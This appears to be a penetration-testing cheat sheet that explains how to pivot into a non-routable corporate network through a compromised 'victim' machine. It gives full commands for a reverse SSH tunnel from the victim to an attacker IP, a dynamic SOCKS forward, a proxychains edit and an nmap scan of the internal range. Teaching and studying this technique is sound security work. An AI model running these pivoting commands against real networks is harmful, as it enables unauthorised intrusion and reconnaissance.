<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Proxychains Using SSH Port Forwarding</title>
</head><body><b><u>Proxy Chains Using SSH Port Forwarding<br/>
<br/>
</u></b><b>Info:</b>&nbsp;Run any network tool through HTTP, SOCKS4 and SOCK5 proxies. &nbsp;<br/>
<br/>
<b>Program: </b>SSH and proxychains<br/>
<b>Note: </b>SSH user accounts on both Machine A and Machine B must be known. <br/>
<br/>
<br/>
<br/>
<b>Set Up:<br/>
</b><br/>
<br/>
<b>On Machine B, SSH connect to Machine A with a Reverse Port Foward.<br/>
<br/>
</b>ssh -f -N -R &lt;remote port to bind&gt;:&lt;local host&gt;:&lt;local port&gt; &lt;user@gateway&gt;<br/>
<b><br/>
</b>root@adminsql:/var/www# ssh -f -N -R 2222:127.0.0.1:22 root@208.68.234.100 <br/>
<br/>
<b>Note: </b><br/>
<br/>
Gateway&#09;&#09;&#09;&#09;=&#09;Machine A ip address<br/>
-R&#09;&#09;&#09;&#09;&#09;= &#09;Remote Port Forwarding<br/>
Remote Port To Bind&#09;= &#09;The port on Machine A that will be used to connect to Machine B's port 22. <br/>
Local host&#09;&#09;&#09;= &#09;the local ip address of Machine B<br/>
Local port &#09;&#09;&#09;= &#09;The port of Machine B to tunnel<br/>
-f&#09;&#09;&#09;&#09;&#09;= &#09;Run process in the background<br/>
-N&#09;&#09;&#09;&#09;&#09;= &#09;Tells SSH that no command will be send once the tunnel is up.<br/>
<br/>
<br/>
<br/>
<b>On Machine A run netstat to see that port 2222 is listening</b><br/>
<br/>
root@kali:~# netstat -lntp<br/>
<br/>
<b>Note</b>: port 2222 on Machine A is connected through the SSH tunnel to port 22 on Machine B<br/>
<br/>
<br/>
<b>On Machine A create a Dynamic Port Forward on port 8080</b><br/>
<br/>
ssh -f -N -D &lt;local proxy port&gt; -p &lt;remote port&gt; &lt;user@target&gt;<br/>
<br/>
root@kali:~# ssh -f -N -D 127.0.0.1:8080 -p 2222 hax0r@127.0.0.1<br/>
<br/>
<b>Note: </b><br/>
<br/>
-D&#09;&#09;&#09;&#09;= &#09;Dynamic Port Forwarding (This tells SSH to run a SOCKS proxy on the local proxy port)<br/>
local proxy port&#09;= &#09;Machine A's port that the SOCKS4 proxy will become active on<br/>
remote port&#09;&#09;= &#09;The port that was Remote forwarded before (2222 on local 127.0.0.1 is connected through a tunnel to port 22 on Machine B)&#09;<br/>
target&#09; &#09;&#09;= &#09;Machine B ip address (127.0.0.1 is used as the port 2222 on local 127.0.0.1 is connected through a tunnel to port 22 on Machine B) <br/>
-f&#09;&#09;&#09;&#09;= &#09;Run process in the background<br/>
-N&#09;&#09;&#09;&#09;= &#09;Tells SSH that no command will be send once the tunnel is up.<br/>
<br/>
<br/>
<b>Note: On Machine A, any traffic directed at local port 8080 will go through the SOCKS proxy, then travel through to local port 2222, which will then get forwarded to port 22 on Machine B and onto Network C. </b><br/>
<br/>
<br/>
<br/>
<b>On Machine A configure proxychains to use local port 8080. </b><br/>
<br/>
<br/>
<b>Run: </b>root@kali:<b>~</b># nano /etc/proxychains.conf <br/>
<br/>
<b>Edit From this:<br/>
</b><br/>
[ProxyList] <br/>
# add proxy here ... <br/>
# meanwile <br/>
# defaults set to tor <br/>
socks4 127.0.0.1 9050 &nbsp;<b>Note:</b>&nbsp;Comment out this line. <br/>
<br/>
<b>Edit To this:</b><br/>
<br/>
[ProxyList] <br/>
# add proxy here ... <br/>
<br/>
socks4 127.0.0.1 8080 <b>Note:</b>&nbsp;Insert this line. <br/>
&nbsp;<br/>
# meanwile <br/>
# defaults set to tor <br/>
<br/>
<br/>
<b>On Machine A Run:</b>&nbsp;<br/>
<br/>
root@kali:~# proxychains nmap --top-ports=20 -sT -Pn 172.16.40.0/24<br/>
<br/>
<b>Note</b>: All proxychains commands will now be run through Machine B which in turn has access to Network C<br/>
<br/>
<b>Usage</b><br/>
<br/>
<b>Situation:</b>&nbsp;Machine B is a vulnerable victim machine which has SSH running on port 22 and is exposed to the internet. It is part of corporate Network C which is non-routable from the outside. <br/>
<br/>
Attacker's Machine&#09;&#09;Victim's Vulnerable Machine &#09;&#09;&#09;&#09;&#09;Victim's Network connected to the vulnerable machine B<ul><li style="list-style-type: none"></li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">Machine A &lt;------------------------------------------&gt; Machine B &lt;------------------------------------------------------------&gt; Network C</li>
</ul>
</li>
</ul>
</li>
</ul>
<br/>
127.0.0.1:8080&lt;-------&gt;127.0.0.1:2222&lt;-------------------------&gt; a.b.c.d:22 &lt;-----------------------------------------&gt; Network (multiple machines and ports)<br/>
<br/>
<br/>
<b>Machine B is a vulnerable victim machine which has SSH listening on port 22 and is part of Network C</b><br/>
<b>Machine B, SSH connects to Machine A with a Reverse Port Foward connecting Machine B's port 22 to Machine A's port 2222<br/>
Machine A creates a Dynamic Port Forward on port 8080, connecting Machine A's port 8080 to Machine A's port 2222 (which is in turn connected to Machine B's port 22)<br/>
Machine A configures proxychains to use local port 8080. <br/>
Machine A can now scan Network C using proxychains to forward all the traffic through Machine B.<br/>
</b><br/>
</body></html>